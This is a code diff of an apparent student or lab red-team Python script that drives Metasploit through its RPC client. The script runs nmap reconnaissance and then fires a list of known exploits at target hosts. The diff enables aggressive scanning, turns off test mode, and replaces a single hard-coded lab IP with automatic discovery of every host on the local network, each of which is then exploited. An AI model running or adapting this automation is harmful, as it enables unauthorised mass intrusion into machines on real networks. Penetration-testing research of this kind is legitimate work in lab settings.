@@ -15,12 +15,12 @@ import scanNetwork
 from knownVulnerabilities import vulnerabilities
 
 CHECK_MODE = False # will check for exploits rather than running them when can
-RUN_NMAP = False # set this to false when you want to test on metasploit machine and assume all exploits will run
-NMAP_AGGRESSIVENESS = 2
+RUN_NMAP = True # set this to false when you want to test on metasploit machine and assume all exploits will run
+NMAP_AGGRESSIVENESS = 3
 # in order of increasing levels of fucking around (and also in increasing levels of finding out)
 NMAP_POSSIBLE_ARGS = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
 EXPLOIT_NUM = 4 # for testing
-TEST_MODE = True
+TEST_MODE = False
 EXPLOIT_NUM = min(EXPLOIT_NUM, len(vulnerabilities) - 1)
 RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through command line argument
 if len(sys.argv) > 1:
@@ -28,7 +28,7 @@ if len(sys.argv) > 1:
 startTime = time.time()
 
 # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
-def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
+def runExploits(RHOST, vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
     consoles = []
     savedOutputInfo = dict()
 
@@ -56,7 +56,7 @@ def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
         # options = exploit.options
         exploit.missing_required
         if 'RHOSTS' in exploit.missing_required:
-            exploit['RHOSTS'] = RHOSTS[0] # TODO: change this to loop through
+            exploit['RHOSTS'] = RHOST
         if exploit.missing_required:
             print("missing options:", exploit.missing_required)
         
@@ -129,29 +129,22 @@ def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
 if __name__ == "__main__":
     #############################################################################
     # RUN ./setup.sh TO SET EVERYTHING UP.  This is for automating the exploit only
-    # proc1 = subprocess.Popen(["yes | ./setup.sh"])
-    # print("FINISHED SETTING UP SERVER")
-    # time.sleep(180)
+    # print("RUNNING INITIAL SETUP")
+    # proc1 = subprocess.Popen(["./setup.sh"])
+    # proc1.wait()
     # proc1.kill()
-
-    # utils.runThisCommand("sudo snap install metasploit-framework")
-    # print(utils.runThisCommand("whoami"))
+    # print("FINISHED INITIAL SETUP")
+    # time.sleep(1)
+    
     # print(utils.runThisCommand("sudo systemctl enable snapd.service"))
     # print(utils.runThisCommand("sudo systemctl start snapd.service"))
-    # time.sleep(5)
 
-    # print("SNAP INSTALLING METASPLOIT-FRAMEWORK") 
-    # p = subprocess.Popen(["sudo snap install metasploit-framework"], stdout=subprocess.PIPE, shell=True)
-    # (output, err) = p.communicate() 
-    # p_status = p.wait()
-    # print("DONE INSTALLING METASPLOIT-FRAMEWORK") 
-    # time.sleep(10)
-
-    # this needs to be run janky like this cuz the command sometimes just hangs 
-    # and doesnt run to completion but its ok cuz it runs the shit we need it to run
-    proc1 = subprocess.Popen(["./setup.sh"])
-    time.sleep(40)
-    proc1.kill()
+    # print("RUNNING SERVER SETUP")
+    # proc2 = subprocess.Popen(["./serverSetup.sh"])
+    # proc2.wait()
+    # proc2.kill()
+    # print("FINISHED SERVER SETUP")
+    # time.sleep(1)
 
     # basically starts metasploit and kill all previous sessions 
     client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
@@ -177,12 +170,14 @@ if __name__ == "__main__":
         exit()
     ##############################################################################################
 
-    nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
+    RHOSTS = scanNetwork.scanNetworkForIPs() # TODO: time which is faster, nmap on no settings then aggressively scan open ports or just aggressively scan everything
+
     for RHOST in RHOSTS:
         print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
         # Decides if we want to run nmap or just assumes all outputs work
-        if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
+        if RUN_NMAP:
             ######## RECONAISSANCE PHASE ########
+            nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
             nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
             print(nmapOutput)
             if (nmapOutput[1][0:22] == "Note: Host seems down."):
@@ -223,7 +218,7 @@ if __name__ == "__main__":
             vulnerabilitiesToUse = vulnerabilities
         
         ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
-        savedOutputInfo = runExploits(vulnerabilitiesToUse)
+        savedOutputInfo = runExploits(RHOST, vulnerabilitiesToUse)
 
         ####### Print some info on the sessions created
         print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
